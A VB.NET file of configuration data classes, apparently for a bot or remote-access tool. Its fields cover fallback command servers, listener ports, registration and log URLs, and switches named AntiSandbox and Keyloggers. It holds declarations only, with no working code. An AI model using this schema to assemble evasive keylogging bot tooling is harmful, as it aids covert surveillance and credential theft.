﻿Public Class ConfigBotModel
    Public Property compilerOptions As compilerOptions
    Public Property exclude As ArrayList
    Public Property Variables As Variables
    Public Property UrlVariables As UrlVariables
    Public Property WebFilters As ArrayList
End Class

Public Class UrlVariables
    Public Property RegistrationUrl As String
    Public Property LogUrl As String
End Class

Public Class Variables
    Public Property Debug As Boolean
    Public Property Address As String
    Public Property FallbackAdress As String
    Public Property CertifiedKey As String
    Public Property SocketPort As Integer
    Public Property ServerReachPort As Integer
    Public Property FallbackServerReachPort As Integer
    Public Property ReachPort As Integer
    Public Property ListenerPort As Integer
    Public Property AntiSandbox As Boolean
    Public Property Keyloggers As Boolean
    Public Property WebMasterAddress As String
    Public Property WebMasterPort As String
End Class

Public Class compilerOptions
    Public Property noImplicitAny As Boolean
    Public Property noEmitOnErro As Boolean
    Public Property removeComments As Boolean
    Public Property sourceMap As Boolean
    Public Property target As String
End Class
